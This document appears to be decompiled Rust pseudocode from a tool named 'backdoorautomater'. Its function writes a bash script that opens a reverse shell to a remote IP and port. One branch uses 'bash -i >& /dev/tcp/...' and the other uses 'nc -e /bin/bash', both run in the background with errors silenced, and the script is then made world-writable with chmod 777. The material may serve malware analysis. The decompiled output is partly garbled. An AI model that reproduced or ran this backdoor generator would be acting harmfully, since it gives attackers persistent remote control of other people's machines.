fn backdoorautomater::shellscript::write_shell_bash(a0: &struct24, a1: &struct24, a2: &struct24) -> u64 {
    let v0: std::fs::File;  // [bp-0x22c]
    let v1: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x228], Other Possible Types: struct24
    let v2: u64;  // [bp-0x220]
    let v3: u64;  // [bp-0x218]
    let v4: alloc::borrow::Cow<str>;  // [bp-0x208], Other Possible Types: struct24, alloc::vec::Vec<u8, alloc::alloc::Global>, core::result::Result<std::process::Output, std::io::error::Error>
    let v5: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x208]
    let v6: u64;  // [bp-0x1f8]
    let v7: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x1c8]
    let v8: struct56;  // [bp-0x1c8]
    let v9: u64;  // [bp-0x1c0]
    let v10: u64;  // [bp-0x1b8]
    let v11: u64;  // [bp-0x1a8]
    let v12: u128;  // [bp-0x188]
    let v13: struct24;  // [bp-0x188]
    let v14: u64;  // [bp-0x178]
    let v15: &str;  // [bp-0x168], Other Possible Types: core::result::Result<std::fs::File, std::io::error::Error>, struct24, struct149
    let v16: &str;  // [bp-0x168]
    let v17: &str;  // [bp-0x168]
    let v18: struct24;  // [bp-0x168]
    let v19: struct149;  // [bp-0x168]
    let v20: std::fs::File;  // [bp-0x164]
    let v21: core::fmt::Arguments;  // [bp-0x160]
    let v22: u128;  // [bp-0x158]
    let v23: struct56;  // [bp-0x98]
    let v24: struct56;  // [bp-0x60]
    let v26: core::fmt::Arguments;  // r12

    v15 = std::fs::File::create(a2, a2);
    match v15 {
        Err(v26) => {
        },
        Ok(v0) => {
            v15 = std::process::Command::new("sh");
            v4 = std::process::Command::output(std::process::Command::arg(std::process::Command::arg(&v15, "-c"), "ls /bin/nc"));
            v23 = core::result::Result<T,E>::expect(&v4, "src/shellscript.rs");
            v19 = std::process::Command::new("sh");
            v4 = std::process::Command::output(std::process::Command::arg(std::process::Command::arg(&v19, "-c"), "ls /bin/usr/nc"));
            v24 = core::result::Result<T,E>::expect(&v4, "src/shellscript.rs");
            if *((&v23.field_32 as &char + 8) as &i64) && *((&v24.field_32 as &char + 8) as &i64) {
                v26 = std::io::Write::write_all(&v0, "#!/bin/bash\n\n");
                if !v26 {
                    v26 = std::io::Write::write_all(&v0, "/bin/bash -c 'bash -i >& /dev/tcp/");
                    if !v26 {
                        v26 = std::io::Write::write_all(&v0, *((a1 + 8) as &i64), *((a1 + 16) as &i64));
                        if !v26 {
                            v26 = std::io::Write::write_all(&v0, "/");
                            if !v26 {
                                v26 = std::io::Write::write_all(&v0, *((a0 + 8) as &i64), *((a0 + 16) as &i64));
                                if !v26 {
                                    v26 = std::io::Write::write_all(&v0, " 0>&1' 2>/dev/null &\n");
                                    if !v26 {
                                        goto LABEL_46005e;
                                    }
                                }
                            }
                        }
                    }
                }
            } else {
                v26 = std::io::Write::write_all(&v0, "#!/bin/bash\n\n");
                if !v26 {
                    v15 = "REMOTE_IP=\"";
                    v22 = *((a1 + 8) as &i128);
                    v4 = alloc::str::join_generic_copy(&v19, 2, 1, 0);
                    v1 = v5;
                    alloc::vec::Vec<T,A>::extend_from_slice(&v1, "\"\n");
                    v26 = std::io::Write::write_all(&v0, v2, v3);
                    if !v26 {
                        v16 = "REMOTE_PORT=";
                        v22 = *((a0 + 8) as &i128);
                        v4 = alloc::str::join_generic_copy(&v19, 2, 1, 0);
                        v7 = v5;
                        alloc::vec::Vec<T,A>::extend_from_slice(&v7, "\n\n");
                        v26 = std::io::Write::write_all(&v0, v9, v10);
                        if !v26 {
                            v26 = std::io::Write::write_all(&v0, "/bin/nc $REMOTE_IP $REMOTE_PORT -e /bin/bash 2>/dev/null &\n");
                            if !v26 {
LABEL_46005e:
                                v17 = "chmod 777 ";
                                v22 = *((a2 + 8) as &i128);
                                v4 = alloc::str::join_generic_copy(&v19, 2, 1, 0);
                                v14 = v6;
                                v12 = *(&v4.buf.cap as &i128);
                                v15 = std::process::Command::new("sh");
                                v4 = v13;
                                v4 = std::process::Command::output(std::process::Command::arg(std::process::Command::arg(&v15, "-c"), &v4));
                                v8 = core::result::Result<T,E>::expect(&v4, "src/shellscript.rs");
                                v4 = alloc::string::String::from_utf8_lossy(v11, *((&v8.field_32 as &char + 8) as &i64));
                                v15 = <T as alloc::slice::hack::ConvertVec>::to_vec(<alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v4), a2);
                                v1 = v18;
                                backdoorautomater::sanitizer::sanitize_system_command(&v1);
                            }
                        }
                    }
                }
            }
        },
    }
    return v26;
}
